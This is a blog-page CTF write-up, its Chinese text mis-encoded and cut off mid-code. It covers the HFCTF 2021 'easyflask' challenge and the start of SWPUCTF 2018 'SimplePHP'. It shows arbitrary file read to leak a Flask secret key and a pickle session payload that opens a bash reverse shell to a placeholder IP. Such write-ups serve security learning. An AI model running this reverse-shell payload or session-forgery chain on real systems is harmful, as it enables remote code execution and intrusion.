

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>buuï¼ˆå››ï¼‰ - liquor&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="buuï¼ˆå››ï¼‰">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-07-30 00:16" pubdate>
        July 30, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.1k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      35
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuï¼ˆå››ï¼‰</h1>
            
            <div class="markdown-body">
              <h1>[HFCTF 2021 Final]easyflask</h1>
<p>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ ¹æ®æç¤ºè¯»å–æºç </p>
<pre><code class="hljs lua">#!/usr/bin/python3<span class="hljs-number">.6</span>
import <span class="hljs-built_in">os</span>
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.<span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span>

User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (object,), &#123;
    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,
    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,
    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,
&#125;)


@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def index_handler():
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):
        u = pickle.dumps(User())
        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span>


@app.route(<span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def file_handler():
    <span class="hljs-built_in">path</span> = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)
    <span class="hljs-built_in">path</span> = <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-built_in">path</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-built_in">path</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.isdir(<span class="hljs-built_in">path</span>) \
            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span>

    with <span class="hljs-built_in">open</span>(<span class="hljs-built_in">path</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as fp:
        content = fp.<span class="hljs-built_in">read</span>()
    <span class="hljs-keyword">return</span> content


@app.route(<span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def admin_handler():
    try:
        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)
        <span class="hljs-keyword">if</span> isinstance(u, dict):#å¦‚æœuå¯¹åº”çš„å€¼æ˜¯å­—å…¸ï¼Œä¼šè¯»å–  u.b
            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))
        u = pickle.loads(u)#pickleååºåˆ—åŒ–
    except Exception:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span>

    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, <span class="hljs-built_in">debug</span>=False)</code></pre>
<p><code>/file</code> è·¯ç”±ï¼Œç”¨æˆ·ä¸Šä¼ çš„ path ä¼šè¢«æ‹¼æ¥åˆ° static ç›®å½•åé¢ï¼Œè¿™é‡Œæœ‰ä¸ªtrickï¼Œå½“ os.path.join çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºç»å¯¹è·¯å¾„æ—¶æ‹¼æ¥çš„ç»“æœå°±æ˜¯è¯¥ç»å¯¹è·¯å¾„,å¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚æ­¤å¤„å¯¹å‚æ•°åšäº†ä¸€äº›é™åˆ¶ã€‚</p>
<img src="/2021/07/30/black/1.png" srcset="/img/loading.gif" alt="1" style="zoom:67%;">
<p><code>/admin</code> è·¯ç”±é‡Œä½¿ç”¨ pickle æ¨¡å—ç›´æ¥å°† session é‡Œçš„å†…å®¹ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å¿…ç„¶åŒ…å«åˆ›å»ºæ–°å¯¹è±¡çš„æ“ä½œï¼Œå¦‚æœ <code>__reduce__</code> é‡ŒåŒ…å«æ”»å‡»ä»£ç å°±å¯ä»¥å®ç°RCEï¼Œååºåˆ—åŒ–çš„è¾“å‡ºå‚¨å­˜åœ¨ session é‡Œï¼Œä½†æ˜¯ session æ•°æ®éƒ½æ˜¯ flask åŠ å¯†è¿‡çš„ï¼Œåªæœ‰çŸ¥é“ secret_key æ‰èƒ½ä¼ªé€  session å®ç° RCEã€‚åˆ©ç”¨ä¼ªæ–‡ä»¶ç³»ç»Ÿ <code>/proc</code>ï¼Œç»“åˆå‰é¢çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»å–åˆ°è‡ªèº«çš„ç¯å¢ƒå˜é‡ï¼Œå³<code>/file?file=/proc/self/environ</code>ï¼Œå¾—åˆ°<code>secret_key</code>ã€‚</p>
<p><img src="/2021/07/30/black/2.png" srcset="/img/loading.gif" alt="2"></p>
<h4 id="tips-Flask-sessionèº«ä»½ä¼ªé€ "><a class="header-anchor" href="#tips-Flask-sessionèº«ä»½ä¼ªé€ ">ğŸ­</a>tips:Flask-sessionèº«ä»½ä¼ªé€ </h4>
<p>flaskæ˜¯æŠŠsessionå­˜åœ¨å®¢æˆ·ç«¯çš„ï¼Œè€Œä¸”åªç»è¿‡base64ç¼–ç å’Œç”¨å¯†é’¥ç­¾åï¼Œè™½ç„¶æ²¡æœ‰æœ‰ç­¾åä¸å¯ä»¥ä¼ªé€ sessionï¼Œä½†æ˜¯æœ‰å¾ˆå¤šä¿¡æ¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä»sessionè§£ç æ‰¾å‡ºæ¥ã€‚</p>
<p>å¦‚ä¸€ä¸² <strong>session</strong> å€¼ä¸ºï¼š <strong>eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY</strong> ï¼Œè§£å¯†ï¼š</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> *
s = &quot;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&quot;
data,<span class="hljs-type">timestamp</span>,secret = s.split(<span class="hljs-string">&#x27;.&#x27;</span>)
<span class="hljs-type">int</span>.from_bytes(base64_decode(<span class="hljs-type">timestamp</span>),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)</code></pre>
<p><img src="/2021/07/30/black/6.png" srcset="/img/loading.gif" alt="6"></p>
<p>å³å¯è·å–ä¿¡æ¯ã€‚</p>
<p>flaskè§£å¯†è„šæœ¬ï¼š</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer
<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>
    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)
    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)

    decompress = <span class="hljs-literal">False</span>
    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):
        payload = payload[<span class="hljs-number">1</span>:]
        decompress = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">try</span>:
        payload = base64_decode(payload)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>
                        <span class="hljs-string">&#x27;an exception&#x27;</span>)

    <span class="hljs-keyword">if</span> decompress:
        <span class="hljs-keyword">try</span>:
            payload = zlib.decompress(payload)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>
                            <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)

    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    print(decryption(<span class="hljs-string">&quot;sessionå€¼&quot;</span>.encode()))</code></pre>
<p>FLASKåŠ å¯†è„šæœ¬ï¼š<br>
<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p>å¼€å§‹ä¼ªé€ sessionï¼šï¼ˆåˆ©ç”¨åå¼¹shellæ„é€ çš„ç®€å•ååºåˆ—åŒ–ï¼‰</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;
    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;tyskill&#x27;</span>,
    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,
    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,
    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#x27;&quot;,))
&#125;)
u = pickle.dumps(<span class="hljs-keyword">User</span>())
print(b64encode(u).decode())
//winå’Œlinuxä¸‹dumpsçš„ç»“æœä¸­åºåˆ—åŒ–å­—ç¬¦ä¸²å£°æ˜ç³»ç»Ÿçš„æ ‡è¯†ç¬¦ä¸åŒï¼šLinux=&gt;posixï¼›Windows=&gt;ntï¼Œéœ€è¦å°†è„šæœ¬æ”¾åœ¨Linuxç¯å¢ƒä¸‹ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</code></pre>
<p>æ‰§è¡Œ</p>
<p><img src="/2021/07/30/black/4.png" srcset="/img/loading.gif" alt="4"></p>
<p>åŠ å¯†ï¼š</p>
<p><img src="/2021/07/30/black/5.png" srcset="/img/loading.gif" alt="5"></p>
<p>æ›¿æ¢æ‰sessionï¼Œç”¨é¶æœºç›‘å¬å³å¯RCEã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117422046">https://blog.csdn.net/LYJ20010728/article/details/117422046</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3569#toc-0">https://xz.aliyun.com/t/3569#toc-0</a></p>
<h1>[SWPUCTF 2018]SimplePHP</h1>
<p>æŸ¥çœ‹æ–‡ä»¶é¡µé¢å¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<p>file.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; 
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; 
ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); 
$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>] ? $_GET[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($file)) &#123; 
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; 
&#125; 
$show = <span class="hljs-keyword">new</span> Show(); 
<span class="hljs-keyword">if</span>(file_exists($file)) &#123; 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($file))&#123; 
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); 
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>file_existsåˆ¤æ–­fileå‚æ•°çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ•…ä¼ªåè®®ä¸èƒ½ç”¨ã€‚è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶èµ‹å€¼ç»™Showç±»çš„$sourceã€‚è°ƒç”¨_show()ï¼Œè¿™ä¸ªå‡½æ•°åœ¨class.phpä¸­</p>
<pre><code class="hljs reasonml">public <span class="hljs-keyword">function</span> <span class="hljs-constructor">_show()</span>&#123;
    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">file</span>:|<span class="hljs-params">gopher</span>|<span class="hljs-params">dict</span>|\.\.|<span class="hljs-params">f1ag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>) &#123;
        die(&#x27;hacker!&#x27;);
    &#125; <span class="hljs-keyword">else</span>&#123;
            highlight<span class="hljs-constructor">_file($<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>;
    &#125;      
&#125;</code></pre>
<p>ä¼ å…¥çš„æ–‡ä»¶åæ­£åˆ™è¿‡æ»¤ï¼Œç»•è¿‡å°±è¯»å–æºç ï¼›æ€»ç»“è¯»å–æµç¨‹ï¼šæ–‡ä»¶å==&gt;file_exists==æ­£åˆ™è¿‡æ»¤==&gt;è¯»å–</p>
<p>function.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-comment">//show_source(__FILE__); </span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; 
header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); 
error_reporting(<span class="hljs-number">0</span>); 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    $filename = md5($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; 
    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span>
    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . $filename)) &#123; 
        unlink($filename); 
    &#125; 
    move_uploaded_file($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . $filename); 
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    <span class="hljs-keyword">if</span>(upload_file_check()) &#123; 
        upload_file_do(); 
    &#125; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    $allowed_types = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); 
    $temp = explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); 
    $extension = end($temp); 
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($extension)) &#123; 
        <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span>
    &#125; 
    <span class="hljs-keyword">else</span>&#123; 
        <span class="hljs-keyword">if</span>(in_array($extension,$allowed_types)) &#123; 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
        &#125; 
        <span class="hljs-keyword">else</span> &#123; 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; 
        &#125; 
    &#125; 
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>è°ƒç”¨upload_fileå‡½æ•°ã€‚ <code>upload_file_check()ï¼šåˆ¤æ–­æ–‡ä»¶åç¼€åï¼Œå¿…é¡»æ˜¯gif/jpeg/jpg/png</code> ==&gt;<code>upload_file_do() ä¸Šä¼ æ–‡ä»¶;æ–‡ä»¶å=md5(æ–‡ä»¶å+IPåœ°å€)</code></p>
<p>åºåˆ—åŒ–ï¼Œæ— unserialize()ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œpharåè®®æœªè¿‡æ»¤ï¼Œåº”è¯¥è¦pharååºåˆ—åŒ–ã€‚</p>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $test;
    <span class="hljs-keyword">public</span> $str;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;str = $name;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $source;
    <span class="hljs-keyword">public</span> $str;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;source = $file;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;
        <span class="hljs-keyword">return</span> $content;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$key,$value</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;$key = $value;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);
        &#125; <span class="hljs-keyword">else</span> &#123;
            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);
        &#125;
        
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;
            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $file;
    <span class="hljs-keyword">public</span> $params;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;
            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];
        &#125; <span class="hljs-keyword">else</span> &#123;
            $value = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span>
